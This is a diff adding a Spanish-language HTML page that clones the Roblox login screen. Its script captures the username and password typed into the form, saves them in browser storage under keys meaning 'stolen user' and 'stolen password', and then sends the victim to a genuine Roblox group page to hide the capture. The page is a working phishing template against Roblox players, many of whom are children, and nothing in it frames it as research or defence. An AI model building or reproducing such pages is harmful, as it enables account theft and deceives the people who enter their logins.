@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body { background-color: #191B1D; color: #FFFFFF; font-family: 'Amazon Ember', Arial, sans-serif; margin: 0; padding: 0; }
+        .navbar { background-color: #232527; padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #393B3D; }
+        .nav-links { display: flex; background-color: #232527; padding: 10px; justify-content: space-around; font-size: 13px; color: #ADB1B5; border-bottom: 1px solid #393B3D; }
+        .main { padding: 30px 20px; text-align: center; }
+        h1 { font-size: 24px; font-weight: bold; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #393B3D; border-radius: 4px; background-color: #393B3D; color: #FFFFFF; box-sizing: border-box; font-size: 16px; }
+        .btn-ini { width: 100%; padding: 12px; background: none; border: 1px solid #FFFFFF; border-radius: 4px; color: white; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        .btn-gray { width: 100%; padding: 12px; background-color: #393B3D; border: none; border-radius: 4px; color: white; margin-top: 10px; font-size: 14px; }
+        .app-banner { background-color: #121415; padding: 15px; display: flex; align-items: center; justify-content: space-between; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; border-top: 1px solid #333; }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div style="display:flex; align-items:center; gap:15px;"><span style="font-size:20px;">☰</span><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" style="width:30px; filter:invert(1);"></div>
+        <div style="display:flex; gap:8px; align-items:center;">
+            <button style="background:#0074BD; color:white; border:none; padding:6px 12px; border-radius:4px; font-weight:bold;">Registro</button>
+            <button style="background:none; color:white; border:1px solid #fff; padding:5px 8px; border-radius:4px;">Iniciar sesión</button>
+            <span>🔍</span>
+        </div>
+    </div>
+    <div class="nav-links"><span>Destacadas</span><span>Mercado</span><span>Crear</span><span>Robux</span></div>
+    <div class="main">
+        <h1>Iniciar sesión en Roblox</h1>
+        <form id="robForm">
+            <input type="text" id="u" placeholder="Usuario/correo/teléfono" required>
+            <input type="password" id="p" placeholder="Contraseña" required>
+            <button type="submit" class="btn-ini">Iniciar sesión</button>
+        </form>
+        <p style="color:#00A2FF; font-size:14px; margin-top:20px;">¿Olvidaste la contraseña o el nombre de usuario?</p>
+        <button class="btn-gray">Envíame un código de un solo uso</button>
+        <button class="btn-gray">Inicio de sesión rápido</button>
+    </div>
+    <div class="app-banner">
+        <div style="display:flex; align-items:center; gap:10px;"><span style="color:#666;">✕</span><div style="width:35px; height:35px; background:white; border-radius:8px;"></div><div style="font-size:11px;"><b>¡Explora Roblox en nuestra App!</b><br>Millones de experiencias...</div></div>
+        <button style="background:#0074BD; color:white; border:none; padding:8px 15px; border-radius:4px; font-weight:bold;">Unirse</button>
+    </div>
+
+    <script>
+        document.getElementById('robForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // GUARDAMOS LOS DATOS
+            localStorage.setItem('u_robado', document.getElementById('u').value);
+            localStorage.setItem('p_robado', document.getElementById('p').value);
+            // REDIRIGIMOS
+            window.location.href = "https://www.roblox.com/groups/12333034/Adopt-Me-Trading-Group#!/about";
+        });
+    </script>
+</body>
+</html>
